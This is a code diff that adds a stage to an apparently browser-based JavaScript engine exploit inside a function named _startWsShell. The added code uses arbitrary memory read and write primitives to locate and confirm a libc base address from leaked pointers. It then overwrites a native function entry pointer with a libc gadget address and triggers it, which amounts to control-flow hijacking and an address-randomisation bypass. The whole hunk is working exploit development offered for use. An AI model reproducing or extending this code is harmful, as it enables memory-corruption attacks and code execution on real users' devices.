@@ -6366,6 +6366,48 @@ function _startWsShell(){
             for(var dH9=1;dH9<=6;dH9++){try{collectH9(pg9-BigInt(dH9*0x1000),0x1000);}catch(eH2){}}
             LB('j pool total n='+foreign9.length);
           }catch(eH3){}
+          /* (4b) THE WINDOW RESIDUE IDENTIFY (session-175: three boots, three
+          * window slots, the SAME residue 0x1230 mod 0x4000 - the window
+          * references ONE popular foreign function multiple times. The
+          * corpus-libc scan at the correct residue found TWO textbook
+          * entries: +0x2d230 (push rbp; push r14; push rbx; sub rsp,0xF0 -
+          * keeps RDI = method-like) and +0x61230 (6 pushes; mov edi,2 -
+          * clobbers RDI). Verify each candidate base with the DOUBLE
+          * ANCHOR; on success the RAX probe fires. Bounded reads at data
+          * addresses (in-module if the module is the ~1.14MB libc). */
+          if(foreign9.length){
+            var CANDS=[0x2d230n,0x61230n];
+            outer15:
+            for(var ci15=0;ci15<CANDS.length;ci15++){
+              for(var pi15=0;pi15<foreign9.length;pi15++){
+                var b15=foreign9[pi15]-CANDS[ci15];
+                if(b15<0x802000000n||b15>=0x880000000n)continue;
+                if((b15&0x3fffn)!==0n)continue;
+                LB('y cand rva=0x'+CANDS[ci15].toString(16)+' ptr=0x'+foreign9[pi15].toString(16)+' base=0x'+b15.toString(16));
+                var gt15=S.absRead(b15+0x1179A8n,8)[0];
+                var te15=S.absRead(b15+0x117AE8n,8)[0];
+                LB('y gt=0x'+gt15.toString(16)+' te=0x'+te15.toString(16)+' want gt=0x'+(lkBL+0xB50n).toString(16)+' te=0x'+(lkBL+0x3F0n).toString(16));
+                if(gt15===lkBL+0xB50n&&te15===lkBL+0x3F0n){
+                  reply.libc='0x'+b15.toString(16);
+                  reply.windowRva='0x'+CANDS[ci15].toString(16);
+                  LB('w *** LIBC CONFIRMED 0x'+b15.toString(16)+' rva=0x'+CANDS[ci15].toString(16)+' ***');
+                  try{
+                    for(var zR15=0;zR15<4;zR15++)S.absWrite(S.fakeScope+BigInt(zR15*8),0n);
+                    if(S.scopeSlot&&S.fakeScope&&S.scopeOrig)S.absWrite(S.scopeSlot,S.fakeScope);
+                    var oF15=S.absRead(S.neEntry.addr+0x28n,8)[0];
+                    S.absWrite(S.neEntry.addr+0x28n,b15+0x611e7n);
+                    try{Math.round(-5.7);}catch(eM15){}
+                    S.absWrite(S.neEntry.addr+0x28n,oF15);
+                    if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
+                    reply.raxAtEntry='0x'+S.absRead(S.fakeScope,8)[0].toString(16);
+                    LB('n RAX-at-entry=0x'+reply.raxAtEntry);
+                  }catch(eR15){}
+                  break outer15;
+                }
+              }
+            }
+          }
+
           /* (5) THE ORACLE */
           var RVAS9=[0x42410n,0x37BF0n,0x366E0n,0x4CDB0n,0x4C3C0n,0x4C240n,0x4C1C0n,0x4C6E0n,0x4C6F0n,0x4C650n,0xB020n,0xB070n];
           var tally9={},bestB9=0n,bestN9=0;
